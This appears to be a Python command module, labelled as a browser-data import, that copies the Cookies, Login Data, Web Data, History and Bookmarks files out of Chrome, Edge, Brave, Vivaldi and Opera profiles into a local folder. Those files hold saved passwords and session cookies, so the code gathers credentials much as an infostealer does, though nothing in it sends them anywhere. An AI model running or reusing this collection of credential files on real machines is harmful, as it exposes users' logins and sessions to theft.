import os
import shutil
from pathlib import Path

def execute(args):
    """
    Import browser data from standard locations.
    Args: Browser name (Chrome, Edge, Brave, Vivaldi, Opera, Opera GX)
    """
    browser = args.strip()
    app_data_local = Path(os.getenv('LOCALAPPDATA'))
    app_data_roaming = Path(os.getenv('APPDATA'))
    
    paths = {
        "Chrome": app_data_local / "Google" / "Chrome" / "User Data" / "Default",
        "Edge": app_data_local / "Microsoft" / "Edge" / "User Data" / "Default",
        "Brave": app_data_local / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default",
        "Vivaldi": app_data_local / "Vivaldi" / "User Data" / "Default",
        "Opera": app_data_roaming / "Opera Software" / "Opera Stable",
        "Opera GX": app_data_roaming / "Opera Software" / "Opera GX Stable"
    }
    
    if browser not in paths:
        return f"Browser {browser} not supported or not found in paths."
        
    source = paths[browser]
    target_dir = Path("browser_data") / browser.replace(" ", "_")
    target_dir.mkdir(parents=True, exist_ok=True)
    
    if not source.exists():
        return f"Source {source} not found."
        
    # Essential files
    essential_files = ["Cookies", "History", "Login Data", "Web Data", "Bookmarks"]
    for f in essential_files:
        src_file = source / f
        if src_file.exists():
            try:
                shutil.copy2(src_file, target_dir / f)
            except Exception as e:
                print(f"Could not copy {f}: {e}")
            
    return f"Successfully imported data from {browser} to {target_dir}"
